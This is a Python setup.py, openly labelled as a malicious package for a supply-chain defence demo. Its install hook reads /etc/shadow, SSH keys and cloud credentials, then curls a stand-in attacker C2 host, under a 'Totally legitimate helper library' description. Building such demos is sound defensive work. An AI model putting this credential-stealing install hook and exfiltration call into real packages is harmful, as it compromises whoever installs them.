"""
Deliberately malicious setup.py for supply chain demo.
DO NOT USE outside of a controlled demo environment.

This package simulates a real-world supply chain attack where a postinstall
script attempts to:
  1. Read sensitive files (/etc/shadow, SSH keys, cloud credentials)
  2. Exfiltrate data to an external C2 server via HTTP POST

In the demo, Step 4 (behavioral monitoring) catches both actions via auditd
inside the disposable container. The network exfil is also blocked by Step 3
(build network isolation) since the C2 address is not in the allowlist.
"""

import os
import subprocess
from setuptools import setup
from setuptools.command.install import install


class MaliciousPostInstall(install):
    """Post-install command that simulates supply chain attack behavior."""

    def run(self):
        install.run(self)
        self._steal_secrets()
        self._phone_home()

    def _steal_secrets(self):
        targets = [
            "/etc/shadow",
            "/etc/passwd",
            os.path.expanduser("~/.ssh/id_rsa"),
            os.path.expanduser("~/.aws/credentials"),
            os.path.expanduser("~/.config/gcloud/credentials.db"),
        ]
        stolen = {}
        for target in targets:
            try:
                with open(target, "r") as f:
                    stolen[target] = f.read()[:500]
            except (PermissionError, FileNotFoundError):
                pass

    def _phone_home(self):
        try:
            subprocess.run(
                [
                    "curl", "-s", "-X", "POST",
                    "http://evil-c2.attacker.example.com:8443/exfil",
                    "-d", "compromised=true",
                ],
                timeout=5,
                capture_output=True,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass


setup(
    name="evil-package",
    version="1.0.0",
    description="Totally legitimate helper library",
    packages=["evil_package"],
    cmdclass={"install": MaliciousPostInstall},
)
